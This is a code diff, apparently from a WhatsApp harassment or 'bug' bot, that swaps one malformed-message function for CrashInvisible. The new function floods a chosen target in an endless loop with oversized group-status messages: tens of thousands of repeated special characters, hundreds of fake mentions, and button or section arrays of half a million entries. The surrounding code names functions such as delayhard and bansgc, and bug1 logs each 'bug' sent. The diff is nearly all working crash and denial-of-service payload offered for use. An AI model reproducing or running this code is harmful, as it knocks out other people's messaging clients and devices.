@@ -1858,78 +1858,115 @@ async function delayhard(sock, target) {
     });
 }
 
-async function tryfuncditz(sock, target) {
-  const msg = {
-    contactMessage: {
-      displayName: "Nullmessage",
-      vcard:
-        "BEGIN:VCARD\n" +
-        "VERSION:3.0\n" +
-        "FN:Nullmessage\n" +
-        "N:Nullmessage;;;;\n" +
-        "TEL;type=CELL;type=VOICE;waid=6281234567890:+6281234567890\n" +
-        "END:VCARD",
-      contextInfo: {
-        forwardingScore: 9999,
-        isForwarded: true,
-        quotedMessage: {
-          locationMessage: {
-            degreesLatitude: -6.2088,
-            degreesLongitude: 106.8456,
-            name: "Nullmessage",
-            address: "Jakarta",
-            url: "https://maps.google.com/?q=-6.2088,106.8456",
-            jpegThumbnail: Buffer.alloc(100, 0xaa),
-            contextInfo: {
-              forwardingScore: 9999,
-              isForwarded: true,
-            },
-          },
-        },
-      },
-    },
-    messageContextInfo: {
-      deviceListMetadata: {
-        senderKeyHash: Buffer.from("0".repeat(10000), "hex"),
-        senderTimestamp: Date.now(),
-        senderAccountType: 0,
-      },
-      deviceListMetadataVersion: 2,
-      messageSecret: Buffer.alloc(32, 7),
-      messageAddOnDurationInSecs: 86400,
-      reportingTokenVersion: 2,
-      supportPayload: JSON.stringify({ x: "Nullmessage" }),
-    },
-    protocolMessage: {
-      type: 0,
-      key: {
-        remoteJid: target,
-        fromMe: true,
-        id: "3EB0" + Math.random().toString(16).slice(2, 18).toUpperCase(),
-      },
-      timestampMs: Date.now(),
-      limitSharing: {
-        sharingLimited: true,
-        trigger: 1,
-        limitSharingSettingTimestamp: Date.now(),
-        initiatedByMe: true,
-      },
-      afterReadDuration: 86400,
-    },
-    messageAssociation: {
-      associationType: 8,
-      parentMessageKey: {
-        remoteJid: target,
-        fromMe: true,
-        id: "3EB0" + Math.random().toString(16).slice(2, 18).toUpperCase(),
-      },
-      messageIndex: 0,
-    },
-  };
+async function CrashInvisible(sock, target) {
+  const options = { noSelfSync: true };
+  
+  while (true) {
+    try {
+      const mentionList = Array.from({ length: 500 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net");
 
-  await sock.relayMessage(target, msg, {
-    participant: { jid: target },
-  });
+      await sock.relayMessage(target, {
+        groupStatusMessageV2: {
+          message: {
+            contactsArrayMessage: {
+              displayName: "ALEX SLAYER" + "𑇂𑆵𑆴𑆿".repeat(60000),
+              contacts: [
+                {
+                  displayName: "ALEX SLAYER",
+                  vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;ALEX SLAYER;\nFN:ALEX SLAYER\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
+                },
+                {
+                  displayName: "ALEX SLAYER",
+                  vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;ALEX SLAYER;\nFN:ALEX SLAYER\nitem1.TEL;waid=5512988103218:+55 12 98810-3218\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
+                }
+              ],
+              contextInfo: {
+                forwardingScore: 1,
+                isForwarded: true,
+                mentionedJid: mentionList,
+                quotedAd: {
+                  advertiserName: "ALEX SLAYER",
+                  mediaType: "IMAGE",
+                  jpegThumbnail: null,
+                  caption: "ALEX SLAYER"
+                },
+                placeholderKey: {
+                  remoteJid: "0@s.whatsapp.net",
+                  fromMe: false,
+                  id: "ABCDEF1234567890"
+                }
+              }
+            }
+          }
+        }
+      }, { participant: { jid: target } });
+
+      await sock.relayMessage(target, {
+        groupStatusMessageV2: {
+          message: {
+            interactiveMessage: {
+              body: { text: "ALEX SLAYER" + "\u200B" + "\u927D" },
+              header: { title: "ALEX SLAYER" },
+              nativeFlowMessage: {
+                buttons: [{
+                  name: "single_select",
+                  buttonParamsJson: JSON.stringify({
+                    icon: "document",
+                    title: "ALEX SLAYER",
+                    sections: Array.from({ length: 505555 }, () => ({}))
+                  })
+                }]
+              }
+            }
+          }
+        }
+      }, options);
+
+      await sock.relayMessage(target, {
+        groupStatusMessageV2: {
+          message: {
+            interactiveMessage: {
+              body: { text: "ALEX SLAYER" + "\u200B" + "\u927D" },
+              header: { title: "ALEX SLAYER" },
+              nativeFlowMessage: {
+                messageParamsJson: JSON.stringify({
+                  tap_target_configuration: {
+                    title: "ALEX SLAYER",
+                    description: "ALEX SLAYER",
+                    canonical_url: "https://wa.me/6288888888",
+                    domain: "wa.me",
+                    button_index: 0
+                  }
+                })
+              }
+            }
+          }
+        }
+      }, options);
+
+      await sock.relayMessage(target, {
+        groupStatusMessageV2: {
+          message: {
+            interactiveMessage: {
+              body: { text: "ALEX SLAYER" + "\u200B" + "\u927D" },
+              header: { title: "ALEX SLAYER" },
+              nativeFlowMessage: {
+                buttons: Array.from({ length: 500000 }, () => ({}))
+              }
+            },
+            interactiveResponseMessage: {
+              nativeFlowResponseMessage: {
+                name: "galaxy_message",
+                paramsJson: "{}",
+                version: 3
+              }
+            }
+          }
+        }
+      }, options);
+
+    } catch (err) {}
+  }
 }
 
 async function halonyetGB(sock, target) {
@@ -2121,7 +2158,7 @@ async function bansgc(sock, targetgroup) {
 async function bug1(sock, target) {
   for (let i = 0; i < 10; i++) {
     try {
-      await tryfuncditz(sock, target);
+      await CrashInvisible(sock, target);
       console.log(`bug send to ${target}`);
     } catch (innerError) {
       console.error(`error:`, innerError);
